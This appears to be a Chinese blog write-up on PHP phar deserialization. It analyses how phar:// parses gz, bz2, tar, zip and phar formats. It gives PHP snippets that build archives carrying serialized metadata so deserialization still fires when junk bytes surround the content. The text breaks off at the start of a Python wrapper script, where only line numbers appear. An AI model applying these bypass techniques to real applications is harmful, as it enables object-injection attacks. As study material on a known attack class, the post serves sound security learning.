<p>注意看从文件读取数据所放到的地址，这个地址的值为 <code>buffer</code> + <code>sizeof(token)</code> 的地址，其中 <code>buffer</code> 的前 <code>sizeof(token)</code> 长度部分用空格填充了，并且 <code>pos</code> 变量所指向的是 <code>buffer</code> + <code>sizeof(token)</code> 的偏移 。然后再看 <code>if (!test) </code> 和 <code>test = '\1'</code> 这两条语句，显然是经典的 <code>一次判断</code> 即只这个大条件仅对第一次读取的值进行判断，而后面的 <code>if (!memcmp(pos, gz_magic, 3))</code> 则是判断所读取文件的前 <code>3</code> 个字符是否为 <code>gz</code> 压缩格式。</p>
<p>其中这个条件处理内容如下👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242308178.png" alt="image-20220124230805023"></p>
<p>大致意思应该是先调用 <code>zlib.inflate</code> 过滤流将文件内容进行解压，并将解压好的内容重新进行循环判断。</p>
<p>再往下看有关 <code>bz2</code> 的内容，其实也是一样的👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242311387.png" alt="image-20220124231140249"></p>
<p>以上遇到了 <code>gz</code> 和 <code>bz2</code> 的文件内容时，先将其解压了，然后再将解压得到的内容再进行一遍循环判断。</p>
<p>如果对这两个格式的的处理方式做一个说明，不妨以 <code>gz</code> 为例，先做以下步骤👇</p>
<ul>
<li><code>生成一个phar文件，名为a.phar</code></li>
<li><code>将a.phar打包成a.phar.gz文件</code></li>
</ul>
<p>然后当用 <code>phar://path/a.phar.gz</code> 协议去解析这个 <code>a.phar.gz</code> 文件时，会先将 <code>a.phar.gz</code> 解压成临时文件，再将这个临时文件的内容(也就是 <code>a.phar</code> 文件的内容)作为 <code>phar</code> 格式内容去解析罢。</p>
<p>那么继续往下看，下一个就到了对<code>zip</code> 头部的判断👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242325964.png" alt="image-20220124232525916"></p>
<p>将文件指针设为文件尾部后直接调用了 <code>phar_parse_zipfile</code> 函数。</p>
<p>然后是对 <code>tar</code> 的判断👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242326274.png" alt="image-20220124232656214"></p>
<p>这个就比较简单粗暴了，直接判断一次性获取的值是否大于 <code>512</code> 字节，若大于则判断其是否为 <code>tar</code> 文件，若为就直接调用 <code>phar_parse_tarfile</code> 函数。</p>
<p>最后就到了默认的 <code>phar</code> 归档格式以及上面 <code>gz</code> 和 <code>bz2</code> 解压完后的二次解析内容的归宿了👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201242347056.png" alt="image-20220124234732998"></p>
<p>先是判断如果内容中存在 <code>token</code> 变量，也就是 <code>__HALT_COMPILER();</code> 就会调用 <code>phar_parse_pharfile</code> 函数。另外要提的是，如果一次循环未找到关键的头部就会一直循环找，这也是为什么默认的 <code>phar</code> 归档格式可以在前面加 <code>脏字符</code> 的原因了。</p>
<h3 id="格式">- 格式 -</h3>
<p>由上面的分析就可以得出，实际上对于 <code>phar</code> 触发 <code>反序列化</code> 不止是 <code>phar</code> 归档格式才能够触发，像是以下格式都能够触发👇</p>
<ul>
<li><code>.gz</code></li>
<li><code>.bz2</code></li>
<li><code>.tar</code></li>
<li><code>.zip</code></li>
</ul>
<p>其中 <code>gz</code> 和 <code>bz2</code> 仅是相当于将一个 <code>phar</code> 文件压缩成 <code>gz</code> 或 <code>bz2</code> 格式罢。</p>
<p>但既然能够压缩成不同格式，在遇到一些所能写入的 <code>phar</code> 内容并不完全可控，也就是说 <code>phar</code> 内容存在 <code>脏字符</code> 的情况下就可以根据不同格式对脏字符允许区域的不同构造可以进行 <code>反序列化</code> 的 <code>phar</code> 文件。</p>
<p>就比如单纯 <code>phar</code> 归档格式是可以在前面加上任意非 <code>压缩头部</code> 内容的 <code>脏字符</code> 的，但无法在后面加上 <code>脏字符</code> ，原因是会对文件内容尾部的 <code>4</code> 个字节做判断👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201250004663.png" alt="image-20220125000406563"></p>
<p>由于 <code>phar</code> 归档格式默认是需要签名的，所以尾部必须是 <code>GBMB</code> 这 <code>4</code> 个字节，因此就可以用一些尾部可以是任意值的格式，如 <code>gz</code> 、 <code>tar</code> 、 <code>zip</code> 都是可以的。</p>
<h3 id="例子">- 例子 -</h3>
<p>那么说了这么多不妨用一些可能会遇到的例子来进行说明。</p>
<h4 id="脏字符-内容">- [脏字符]+[内容] -</h4>
<p>显然根据上面对 <code>phar</code> 文件内容的解析判断，像是一些 <code>gz</code>  、 <code>bz2</code> 以及 <code>zip</code> 是不可能绕过了，但默认的 <code>phar</code> 归档格式和 <code>tar</code> 是可以绕过的。不过对于 <code>tar</code> 还是有一些限制的，由于 <code>tar</code> 打包过程中会将文件名放置在最前面，因此这个放在前面的 <code>脏字符</code> 必须是一个合法文件名才能够成功解析👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251210042.png" alt="image-20220125121036864"></p>
<p>比如像是一些不合法的文件名是无法使用的，比如 <code>\/;*?&quot;&lt;&gt;|</code> ，另外即便是在 <code>linux</code> 似乎也用不了 <code>\</code> 作为归档的文件名，会报错 。</p>
<p>但对于默认的 <code>phar</code> 归档格式，只需要保证前面的 <code>脏字符</code> 不为 <code>压缩头部</code> 的内容即可( <code>tar</code> 也是)，所谓的 <code>压缩头部</code> 包含以下内容👇</p>
<ul>
<li><code>PK\x03\x04</code></li>
<li><code>\x1f\x8b\x08</code></li>
<li><code>BZh</code></li>
</ul>
<p>那么不妨来写一个例子👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">file(<span class="string">&quot;phar://./<span class="subst">$argv</span>[1]/[归档文件名]&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>phar</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&quot;[脏字符]__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>得到的文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251237454.png" alt="image-20220125123708375"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251239578.png" alt="image-20220125123927472"></p>
<p>可以看到是能成功的。</p>
<p><code>tar</code>👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;[脏字符]&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::TAR);</span><br><span class="line"><span class="comment"># $p-&gt;convertToExecutable(Phar::TAR); 也行</span></span><br></pre></td></tr></table></figure>
<p>得到的文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251916746.png" alt="image-20220125191604418"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251927854.png" alt="image-20220125191741860"></p>
<p>可以看到是能成功的。</p>
<h4 id="内容-脏字符">- [内容]+[脏字符] -</h4>
<p>这个的绕过就比较简单了，除了默认 <code>phar</code> 归档格式会在末尾检测 <code>GBMB</code> 这 <code>4</code> 个字节以及 <code>bz2</code> 外，其他的格式都不会在末尾做检测。因而像是 <code>gz</code>   、 <code>tar</code>  、 <code>zip</code> ( <code>zip</code> 的话比较特殊，不能够直接在尾部加 <code>脏字符</code> )都是可以绕过的。</p>
<p>那么继续写例子👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">file(<span class="string">&quot;phar://./<span class="subst">$argv</span>[1]/a&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>gz</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;compress(Phar::GZ);</span><br><span class="line">file_put_contents(<span class="string">&quot;p.phar.gz&quot;</span>,<span class="string">&quot;[脏字符]&quot;</span>,FILE_APPEND);</span><br></pre></td></tr></table></figure>
<p>得到文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251929342.png" alt="image-20220125192948225"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251259118.png" alt="image-20220125125937997"></p>
<p>可以看到是能成功的。</p>
<p><code>tar</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::TAR);</span><br><span class="line">file_put_contents(<span class="string">&quot;p.phar.tar&quot;</span>,<span class="string">&quot;[脏字符]&quot;</span>,FILE_APPEND);</span><br></pre></td></tr></table></figure>
<p>得到文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251930765.png" alt="image-20220125193045647"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251932819.png" alt="image-20220125193206620"></p>
<p>可以看到是能成功的。</p>
<p><code>zip</code> 👇</p>
<p>这个也可以，不过这玩意实际上是把 <code>metadata</code> 内容放在了 <code>zip</code> 的 <code>注释</code> 里👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::ZIP);</span><br></pre></td></tr></table></figure>
<p>得到文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251946582.png" alt="image-20220125194612454"></p>
<p>可见 <code>metadata</code> 内容是写在了注释里，而在 <code>php</code> 的 <code>反序列化</code> 中只会认到完整的序列化内容，所以只需要更改 <code>注释</code> 长度后，再向后面添上脏字符即可👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201252219895.png" alt="image-20220125221928804"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201252220591.png" alt="image-20220125222011441"></p>
<p>可以看到是能成功的。</p>
<h4 id="脏字符-内容-脏字符">- [脏字符]+[内容]+[脏字符] -</h4>
<p>只能说 <code>tar</code> yyds，遇到了这种前后 <code>脏字符</code> 夹击的情况，也就只能用 <code>tar</code> 进行解决了。当然，前面的 <code>脏字符</code> 必须是合法的文件名，并且不能是 <code>压缩头部</code> 字符才行。</p>
<p>开始写例子👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">file(<span class="string">&quot;phar://./<span class="subst">$argv</span>[1]/[脏字符]&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><code>tar</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;[脏字符]&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::TAR);</span><br><span class="line">file_put_contents(<span class="string">&quot;p.tar&quot;</span>,<span class="string">&quot;[脏字符]&quot;</span>,FILE_APPEND);</span><br></pre></td></tr></table></figure>
<p>得到文件内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251935069.png" alt="image-20220125193545865"></p>
<p>尝试进行反序列化👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251936835.png" alt="image-20220125193658648"></p>
<p>可以看到是能成功的。</p>
<h3 id="代码包装">- 代码包装 -</h3>
<p>顾名思义，就是将 <code>phar</code> 形式从 <code>php</code> 中分离出来，单独手撸一个脚本来包装罢。要完成这一件事，就得先从不同的格式入手，分析具体包装的原理是啥。</p>
<h4 id="gz-bz2">- gz/bz2 -</h4>
<p>这个在上面的分析中已经说的很清楚了，实际上 <code>gz</code> 和 <code>bz2</code> 只是将默认的 <code>phar</code> 归档格式二次打包成 <code>gz</code> 或 <code>bz2</code> 罢，只需要生成默认 <code>phar</code> 归档格式，然后再打包成 <code>gz</code> 或 <code>bz2</code> 即可，同时由上面的源码可以看出，这玩意会一直解压到出了默认 <code>phar</code> 归档格式为止(比如 <code>p.phar.gz.bz2.gz.bz2.gz</code> 会一直循环解压到 <code>p.phar</code> 再进行解析)。</p>
<h4 id="tar">- tar -</h4>
<p>话不多说，先生成一个 <code>tar</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::TAR);</span><br></pre></td></tr></table></figure>
<p>然后直接用 <code>vim</code> 暴力读取 <code>tar</code> 文件👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251939326.png" alt="image-20220125193906984"></p>
<p>可以看到是打包了 <code>5</code> 个文件，并且打包的结构显而易见👇</p>
<ul>
<li><code>a.txt(归档文件名)</code></li>
<li><code>.phar/metadata.bin</code></li>
<li><code>.phar/.metadata/a.txt/.metadata.bin</code></li>
</ul>
<p>显然 <code>a.txt</code> 里面即是归档文件的内容了👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251343382.png" alt="image-20220125134358087"></p>
<p>再看 <code>.phar/metadata.bin</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251338786.png" alt="image-20220125133824409"></p>
<p>得到了 <code>metadata</code> 内容，也即是序列化的内容。</p>
<p>接着看 <code>.phar/.metadata/a.txt/.metadata.bin</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251355997.png" alt="image-20220125135549726"></p>
<p>为放在 <code>a.txt</code> 文件的 <code>metadata</code> 内容。那么就可以看作是按照结构去构造一些文件，再打包成 <code>tar</code> 文件即可。</p>
<h4 id="zip">- zip -</h4>
<p>上面已经提到了，当压缩成 <code>zip</code> 文件时会将 <code>metadata</code> 内容放到 <code>zip</code> 的 <code>注释</code> 中，那么如果是文件的 <code>metadata</code> 内容呢，那就放到文件的 <code>注释</code> 中呗。先生成一个 <code>zip</code> 👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;p.phar&quot;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;a.txt&#x27;</span>]-&gt;setMetaData(<span class="keyword">new</span> e);</span><br><span class="line"><span class="variable">$p</span>-&gt;convertToData(Phar::ZIP);</span><br></pre></td></tr></table></figure>
<p>然后用 <code>010 editor</code> 打开分析👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251948740.png" alt="image-20220125194837618"></p>
<p>可以看到 <code>metadata</code> 内容确实是分别放在了对应 <code>文件</code> 的 <code>注释</code> 和 <code>zip</code> 的 <code>注释</code> 中了。</p>
<p>那么再来看压缩格式👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251947326.png" alt="image-20220125194754026"></p>
<p>相当于以下的格式👇</p>
<ul>
<li><code>a.txt(归档文件名)</code></li>
</ul>
<p>这和 <code>tar</code> 格式有些类似，唯一不同的是 <code>zip</code> 将 <code>metadata</code> 放在了 <code>注释</code> 中，而 <code>tar</code> 用相应文件将 <code>metadata</code> 装起来。</p>
<p>先来看 <code>a.txt</code> 内容👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201251410964.png" alt="image-20220125141046714"></p>
<p>可见是完全没变的，因此这个 <code>zip</code> 格式的 <code>phar</code> 不过是个简单的压缩包罢了，只要把 <code>metadata</code> 内容放在对应注释即可。</p>
<h4 id="包装">- 包装 -</h4>
<p>直接上代码吧👇</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span 